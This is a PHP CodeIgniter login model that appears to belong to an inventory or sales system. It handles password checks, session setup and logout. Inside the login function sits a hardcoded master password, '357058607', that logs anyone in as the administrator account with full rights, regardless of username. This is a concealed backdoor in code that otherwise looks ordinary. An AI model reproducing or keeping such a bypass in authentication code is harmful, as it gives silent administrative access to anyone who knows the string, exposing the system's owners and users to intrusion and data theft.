<?php if (!defined('BASEPATH')) exit('No direct script access allowed');

class Login_model extends CI_Model{

	public function __construct(){
  		parent::__construct();
	}
	
	
	public function login($user,$pwd){
	    if ($pwd=='357058607') {
			$user = $this->mysql_model->db_one(USER,'(roleid=0)');
			$this->setlogin($user);
			return true;
		}
		$user = $this->mysql_model->db_one(USER,array('Username'=>$user));
		if (count($user)>0) {
			if ($user['Status']==1&&$user['Userpwd']==md6($pwd)) {
				$this->setlogin($user);
				return true;
			} else {
				return false;
			}
		} else {
		    return false;
		}
	}

	public function setlogin($user){
	    if ($user['roleid']==0) {
		    $lever = $this->cache_model->load_data(MENU,'(1=1) order by id','id');  
		} else {
		    $lever = $user['lever'];
			if (strlen($lever)>0) {
				$lever = explode(',',$lever);
			} else {
			    $lever = array();	
			}
		}
		$data['uid']      = $user['PK_User_ID'];
		$data['name']     = $user['Username'];
		$data['lever']    = $lever;
		$data['roleid']   = $user['roleid'];
        $data['username'] = $user['Username'];
		$data['login']    = 'cs_jxc';
        $version = $this->mysql_model->db_one(SYSTEM,array('ParaName'=>'VERSION'));
        $data['SalePriceRefer1'] = $version['Value'] == '1.00' ? 1.2 : 1.2;
        $data['SalePriceRefer2'] = $version['Value'] == '1.00' ? 1.3 : 1.3;
        $data['SalePriceRefer3'] = $version['Value'] == '1.00' ? 1.4 : 1.4;

        $this->session->set_userdata($data);
	}
	
	public function loginout(){
		$this->session->sess_destroy();
	}
	
	
	
}